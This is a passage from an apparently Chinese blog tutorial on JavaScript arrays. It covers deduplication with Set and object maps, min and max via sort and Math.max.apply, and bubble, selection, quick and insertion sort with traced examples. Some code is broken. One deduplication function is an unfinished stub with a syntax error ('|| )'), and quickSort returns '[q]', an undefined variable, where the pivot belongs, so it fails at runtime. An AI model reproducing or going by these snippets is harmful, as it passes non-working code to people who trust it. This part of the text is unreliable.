newArr[newArr.length<span class="number">-1</span>]) &#123; <span class="comment">// 将不等于的放在新数组的后面，等于的跳过</span></span><br><span class="line">      newArr.push(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法6（es6-set方法）"><a href="#方法6（es6-set方法）" class="headerlink" title="方法6（es6 set方法）"></a>方法6（es6 set方法）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArr</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">  arr.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    s.add(item);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> [...s];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法7（set-Array-from）"><a href="#方法7（set-Array-from）" class="headerlink" title="方法7（set + Array.from）"></a>方法7（set + Array.from）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArr</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// new Set(arr); // input: [2, 3, 4, 5, 3, 5], output: &#123;2, 3, 4, 5&#125;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法8（set-…扩展运算符）"><a href="#方法8（set-…扩展运算符）" class="headerlink" title="方法8（set + …扩展运算符）"></a>方法8（set + …扩展运算符）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArr</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// new Set(arr); // input: [2, 3, 4, 5, 3, 5], output: &#123;2, 3, 4, 5&#125;</span></span><br><span class="line">  <span class="keyword">return</span> [...new <span class="built_in">Set</span>(arr)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数组中含所有不定类型值的去重"><a href="#数组中含所有不定类型值的去重" class="headerlink" title="数组中含所有不定类型值的去重"></a>数组中含所有不定类型值的去重</h1><h2 id="普通法"><a href="#普通法" class="headerlink" title="普通法"></a>普通法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArr</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>, len = arr.length; i &lt; len; i++)&#123;</span><br><span class="line">    <span class="comment">// 先处理特殊的类型：array、object、null</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> arr[i] === <span class="string">'object'</span> || <span class="built_in">Array</span>.isArray(arr[i]) || ) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="map法"><a href="#map法" class="headerlink" title="map法"></a>map法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniqueArr</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res = [];</span><br><span class="line">    <span class="keyword">var</span> o = <span class="built_in">Object</span>.create(<span class="literal">null</span>); <span class="comment">// 创建一个完全干净的空对象，内部没有__proto__属性</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> arr) &#123;</span><br><span class="line">        <span class="keyword">var</span> type = <span class="keyword">typeof</span> v;</span><br><span class="line">        <span class="keyword">if</span>(!o[v]) &#123;</span><br><span class="line">            res.push(v);</span><br><span class="line">            o[v] = [type];</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(o[v].indexOf(type) == <span class="number">-1</span>) &#123;</span><br><span class="line">            o[v].push(type);</span><br><span class="line">             res.push(v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="取数组中的最大最小值"><a href="#取数组中的最大最小值" class="headerlink" title="取数组中的最大最小值"></a>取数组中的最大最小值</h1><h2 id="排序法"><a href="#排序法" class="headerlink" title="排序法"></a>排序法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">arr.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;); <span class="comment">// [0, 1, 2, 3, 4, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> min = arr[<span class="number">0</span>];  <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">var</span> max = arr[arr.length - <span class="number">1</span>];  <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h2 id="apply方法"><a href="#apply方法" class="headerlink" title="apply方法"></a>apply方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.max.apply(<span class="literal">null</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br><span class="line"><span class="built_in">Math</span>.min.apply(<span class="literal">null</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// apply()方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>.<span class="title">apply</span>(<span class="params">thisObj[, argArray]</span>); // 2个参数，参数2为数组</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// <span class="title">call</span>(<span class="params"></span>)方法</span></span><br><span class="line"><span class="function"><span class="title">function</span>.<span class="title">call</span>(<span class="params">thisObj[, arg1[, arg2[, [, ...argN]]]]</span>); // 多个参数，其他参数为非数组</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// 同理，利用<span class="title">apply</span>方法还可以用于拼接数组：</span></span><br><span class="line"><span class="function"><span class="title">var</span> <span class="title">arr1</span> = <span class="title">new</span> <span class="title">Array</span>(<span class="params"><span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span></span>);</span></span><br><span class="line"><span class="function"><span class="title">var</span> <span class="title">arr2</span> = <span class="title">new</span> <span class="title">Array</span>(<span class="params"><span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span></span>);</span></span><br><span class="line"><span class="function"><span class="title">Array</span>.<span class="title">prototype</span>.<span class="title">push</span>.<span class="title">apply</span>(<span class="params">arr1, arr2</span>); // 返回数组长度 6</span></span><br><span class="line">arr1.push.apply(arr1, arr2); // arr1:["1", "2", "3", "4", "5", "6"]</span><br><span class="line"><span class="comment">// 上面的等同于</span></span><br><span class="line">arr1.push(...arr2); <span class="comment">// ES6语法</span></span><br><span class="line">arr1.concat(arr2); <span class="comment">// ES5语法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 更多apply和call用法见：https://www.cnblogs.com/lengyuehuahun/p/5643625.html</span></span><br></pre></td></tr></table></figure><h1 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h1><blockquote><p>参考：<a href="https://segmentfault.com/a/1190000010413296" target="_blank" rel="noopener">segmentfault【wscats】 十大经典排序算法</a></p></blockquote><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p><img src="../images/javascript/js_bubble_sort.gif" title="冒泡排序原理图"></p><ol><li>比较相邻的元素，如果第一个比第二个大，就交换他们两个。</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li><li>针对所有的元素重复以上的步骤，除了最后一个。</li><li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li><li>实际排序时，由后往前完成排序动作。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> len = arr.length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[j] &gt; arr[j+<span class="number">1</span>]) &#123; <span class="comment">// 相邻元素两两对比</span></span><br><span class="line">        <span class="comment">// 使用中间变量实现元素交互</span></span><br><span class="line">        <span class="comment">// var temp = arr[j+1];</span></span><br><span class="line">        <span class="comment">// arr[j+1] = arr[j];</span></span><br><span class="line">        <span class="comment">// arr[j] = temp;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// es6数组解构实现元素交互</span></span><br><span class="line">        [arr[j], arr[j+<span class="number">1</span>]] = [arr[j+<span class="number">1</span>], arr[j]];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设arr是一个数组为5的数组</span></span><br><span class="line"><span class="comment">// i  j</span></span><br><span class="line"><span class="comment">// ----</span></span><br><span class="line"><span class="comment">// 0  0</span></span><br><span class="line"><span class="comment">// 0  1</span></span><br><span class="line"><span class="comment">// 0  2</span></span><br><span class="line"><span class="comment">// 0  3</span></span><br><span class="line"><span class="comment">// ----</span></span><br><span class="line"><span class="comment">// 1  0</span></span><br><span class="line"><span class="comment">// 1  1</span></span><br><span class="line"><span class="comment">// 1  2</span></span><br><span class="line"><span class="comment">// ----</span></span><br><span class="line"><span class="comment">// 2  0</span></span><br><span class="line"><span class="comment">// 2  1</span></span><br><span class="line"><span class="comment">// ----</span></span><br><span class="line"><span class="comment">// 3  0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由上面可以看出，取arr[j]和arr[j+1]即是两个相邻元素的比较</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以数组[1, 8, 5, 4, 7, 3, 9, 2, 6]为例，实际冒泡排序如下：</span></span><br><span class="line"><span class="comment">// ① ⑧ 5 4 7 3 9 2 6   // 1与8比较 =&gt; 1 8 5 4 7 3 9 2 6</span></span><br><span class="line"><span class="comment">// 1 ⑧ ⑤ 4 7 3 9 2 6   // 8与5比较 =&gt; 1 5 8 4 7 3 9 2 6</span></span><br><span class="line"><span class="comment">// 1 5 ⑧ ④ 7 3 9 2 6   // 8与4比较 =&gt; 1 5 4 8 7 3 9 2 6</span></span><br><span class="line"><span class="comment">// 1 5 4 ⑧ ⑦ 3 9 2 6   // 8与7比较 =&gt; 1 5 4 7 8 3 9 2 6</span></span><br><span class="line"><span class="comment">// 1 5 4 7 ⑧ ③ 9 2 6   // 8与3比较 =&gt; 1 5 4 7 3 8 9 2 6</span></span><br><span class="line"><span class="comment">// 1 5 4 7 3 ⑧ ⑨ 2 6   // 8与9比较 =&gt; 1 5 4 7 3 8 9 2 6</span></span><br><span class="line"><span class="comment">// 1 5 4 7 3 8 ⑨ ② 6   // 9与2比较 =&gt; 1 5 4 7 3 8 2 9 6</span></span><br><span class="line"><span class="comment">// 1 5 4 7 3 8 2 ⑨ ⑥   // 9与6比较 =&gt; 1 5 4 7 3 8 2 6 9</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// ① ⑤ 4 7 3 8 2 9 6   // 1与5比较 =&gt; 1 5 4 7 3 8 2 6 9</span></span><br><span class="line"><span class="comment">// 1 ⑤ ④ 7 3 8 2 6 9   // 5与4比较 =&gt; 1 4 5 7 3 8 2 6 9</span></span><br><span class="line"><span class="comment">// 1 4 ⑤ ⑦ 3 8 2 6 9   // 5与7比较 =&gt; 1 4 5 7 3 8 2 6 9</span></span><br><span class="line"><span class="comment">// 1 4 5 ⑦ ③ 8 2 6 9   // 7与3比较 =&gt; 1 4 5 3 7 8 2 6 9</span></span><br><span class="line"><span class="comment">// 1 4 5 3 ⑦ ⑧ 2 6 9   // 7与8比较 =&gt; 1 4 5 3 7 8 2 6 9</span></span><br><span class="line"><span class="comment">// 1 4 5 3 7 ⑧ ② 6 9   // 8与2比较 =&gt; 1 4 5 3 7 2 8 6 9</span></span><br><span class="line"><span class="comment">// 1 4 5 3 7 2 ⑧ ⑥ 9   // 8与6比较 =&gt; 1 4 5 3 7 2 6 8 9</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ① ④ 5 3 7 2 6 8 9   // 1与4比较 =&gt; 1 4 5 3 7 2 6 8 9</span></span><br><span class="line"><span class="comment">// 1 ④ ⑤ 3 7 2 6 8 9   // 4与5比较 =&gt; 1 4 5 3 7 2 6 8 9</span></span><br><span class="line"><span class="comment">// 1 4 ⑤ ③ 7 2 6 8 9   // 5与3比较 =&gt; 1 4 3 5 7 2 6 8 9</span></span><br><span class="line"><span class="comment">// 1 4 3 ⑤ ⑦ 2 6 8 9   // 5与7比较 =&gt; 1 4 3 5 7 2 6 8 9</span></span><br><span class="line"><span class="comment">// 1 4 3 5 ⑦ ② 6 8 9   // 7与2比较 =&gt; 1 4 3 5 2 7 6 8 9</span></span><br><span class="line"><span class="comment">// 1 4 3 5 2 ⑦ ⑥ 8 9   // 7与6比较 =&gt; 1 4 3 5 2 6 7 8 9</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// ① ④ 3 5 2 6 7 8 9   // 1与4比较 =&gt; 1 4 3 5 2 6 7 8 9</span></span><br><span class="line"><span class="comment">// 1 ④ ③ 5 2 6 7 8 9   // 4与3比较 =&gt; 1 3 4 5 2 6 7 8 9</span></span><br><span class="line"><span class="comment">// 1 3 ④ ⑤ 2 6 7 8 9   // 4与5比较 =&gt; 1 3 4 5 2 6 7 8 9</span></span><br><span class="line"><span class="comment">// 1 3 4 ⑤ ② 6 7 8 9   // 5与2比较 =&gt; 1 3 4 2 5 6 7 8 9</span></span><br><span class="line"><span class="comment">// 1 3 4 2 ⑤ ⑥ 7 8 9   // 5与6比较 =&gt; 1 3 4 2 5 6 7 8 9</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// ① ② 3 4 5 6 7 8 9   // 1与2比较 =&gt; 1 2 3 4 5 6 7 8 9</span></span><br></pre></td></tr></table></figure><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><p><img src="../images/javascript/js_select_sort.gif" title="选择排序原理图"></p><ol><li>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。</li><li>再从剩余未排序元素中继续寻找最小（大）元素，然后放到<strong><em>已排序序列</em></strong>的末尾。</li><li>重复第二步，直到所有元素均排序完毕。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectionSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> len = arr.length;</span><br><span class="line">  <span class="keyword">var</span> minIndex, temp;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123; <span class="comment">// 此处循环到倒数第二项即可，届时最后一项已经完成排序（最大或最小）</span></span><br><span class="line">    minIndex = i; <span class="comment">// 假设次数最小数的索引为当前i</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123; <span class="comment">// 遍历i之后的数</span></span><br><span class="line">      <span class="keyword">if</span> (arr[j] &lt; arr[minIndex]) &#123; <span class="comment">// 存在比minIndex还小的数</span></span><br><span class="line">        minIndex = j;               <span class="comment">// 将最小数的索引赋给minIndex</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 此时minIndex可能等于i（即上面遍历之后不存在更小的），也可能不等于i（存在更小的，即arr[minIndex] &lt; arr[i]）;</span></span><br><span class="line">    <span class="comment">// 但是此时minIndex &gt;= i，所以我们交换arr[i]和arr[minIndex]的位置即可</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 minIndex对应的数 放在当前索引对应的数的前面</span></span><br><span class="line">    <span class="comment">// temp = arr[i];</span></span><br><span class="line">    <span class="comment">// arr[i] = arr[minIndex];</span></span><br><span class="line">    <span class="comment">// arr[minIndex] = temp;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// es6数组结构实现元素交换</span></span><br><span class="line">    [arr[i], arr[minIndex]] = [arr[minIndex], arr[i]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以数组[1, 8, 5, 4, 7, 3, 9, 2, 6]为例，实际选择排序如下：</span></span><br><span class="line"><span class="comment">// ① 8 5 4 7 3 9 2 6   // 1与1交换</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 1 ⑧ 5 4 7 3 9 ② 6  // 8与2交换</span></span><br><span class="line"><span class="comment">// 1 2 5 4 7 3 9 8 6</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 1 2 ⑤ 4 7 ③ 9 8 6  // 5与3交换</span></span><br><span class="line"><span class="comment">// 1 2 3 4 7 5 9 8 6</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 1 2 3 ④ 7 5 9 8 6   // 4与4交换</span></span><br><span class="line"><span class="comment">// 1 2 3 4 7 5 9 8 6</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 1 2 3 4 ⑦ ⑤ 9 8 6  // 7与5交换</span></span><br><span class="line"><span class="comment">// 1 2 3 4 5 7 9 8 6</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 1 2 3 4 5 ⑦ 9 8 ⑥  // 7与6交换</span></span><br><span class="line"><span class="comment">// 1 2 3 4 5 6 9 8 7</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 1 2 3 4 5 6 ⑨ 8 ⑦  // 9与7交换</span></span><br><span class="line"><span class="comment">// 1 2 3 4 5 6 7 8 9</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 1 2 3 4 5 6 7 ⑧ 9   // 8与8交换</span></span><br><span class="line"><span class="comment">// 1 2 3 4 5 6 7 8 9</span></span><br></pre></td></tr></table></figure><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><img src="../images/javascript/js_quick_sort.gif" title="快速排序原理图"></p><ol><li>从数列中挑出一个元素，称为 “基准”（pivot）;</li><li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</li><li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (arr.length &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> leftArr = [];</span><br><span class="line">  <span class="keyword">let</span> rightArr = [];</span><br><span class="line">  <span class="keyword">let</span> pivot = arr[<span class="number">0</span>]; <span class="comment">// 选择第一项作为基准值</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123; <span class="comment">// 从1开始遍历，因为0已经作为基准值使用了</span></span><br><span class="line">    <span class="keyword">if</span> (arr[i] &gt; pivot) &#123;</span><br><span class="line">      rightArr.push(arr[i]);     </span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">      leftArr.push(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> [].concat(quickSort(leftArr), [q], quickSort(rightArr)); <span class="comment">// 拼接左分区、基准值、右分区（进行递归）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以数组[1, 8, 5, 4, 7, 3, 9, 2, 6]为例，实际快速排序如下：</span></span><br><span class="line"><span class="comment">// arr:[1, 8, 5, 4, 7, 3, 9, 2, 6] </span></span><br><span class="line"><span class="comment">// ├── left: []</span></span><br><span class="line"><span class="comment">// │</span></span><br><span class="line"><span class="comment">// ├── pivot: 1</span></span><br><span class="line"><span class="comment">// │</span></span><br><span class="line"><span class="comment">// └── right:[8, 5, 4, 7, 3, 9, 2, 6]</span></span><br><span class="line"><span class="comment">//     │</span></span><br><span class="line"><span class="comment">//     ├── left: [5, 4, 7, 3, 2, 6]</span></span><br><span class="line"><span class="comment">//     │   │</span></span><br><span class="line"><span class="comment">//     │   ├── left: [4, 3, 2]</span></span><br><span class="line"><span class="comment">//     │   │   │</span></span><br><span class="line"><span class="comment">//     │   │   ├── left: [3, 2]</span></span><br><span class="line"><span class="comment">//     │   │   │   │ </span></span><br><span class="line"><span class="comment">//     │   │   │   ├── left: [2]</span></span><br><span class="line"><span class="comment">//     │   │   │   │</span></span><br><span class="line"><span class="comment">//     │   │   │   ├── pivot: 3</span></span><br><span class="line"><span class="comment">//     │   │   │   │</span></span><br><span class="line"><span class="comment">//     │   │   │   └── right: []</span></span><br><span class="line"><span class="comment">//     │   │   │    </span></span><br><span class="line"><span class="comment">//     │   │   ├── pivot: 4</span></span><br><span class="line"><span class="comment">//     │   │   │</span></span><br><span class="line"><span class="comment">//     │   │   └── right: []</span></span><br><span class="line"><span class="comment">//     │   │   </span></span><br><span class="line"><span class="comment">//     │   ├── pivot: 5</span></span><br><span class="line"><span class="comment">//     │   │</span></span><br><span class="line"><span class="comment">//     │   └── right: [7, 6]</span></span><br><span class="line"><span class="comment">//     │       │</span></span><br><span class="line"><span class="comment">//     │       ├── left: [6]</span></span><br><span class="line"><span class="comment">//     │       │</span></span><br><span class="line"><span class="comment">//     │       ├── pivot: 7</span></span><br><span class="line"><span class="comment">//     │       │</span></span><br><span class="line"><span class="comment">//     │       └── right: []</span></span><br><span class="line"><span class="comment">//     │ </span></span><br><span class="line"><span class="comment">//     ├── pivot: 8</span></span><br><span class="line"><span class="comment">//     │</span></span><br><span class="line"><span class="comment">//     └── right: [9]</span></span><br><span class="line"><span class="comment">//     </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 按上图拆分完毕后，从内到外拼接（递归）即可完成排序得到：[1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><p><img src="../images/javascript/js_insert_sort.gif" title="插入排序原理图"></p><ol><li>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</li><li>从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。）<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 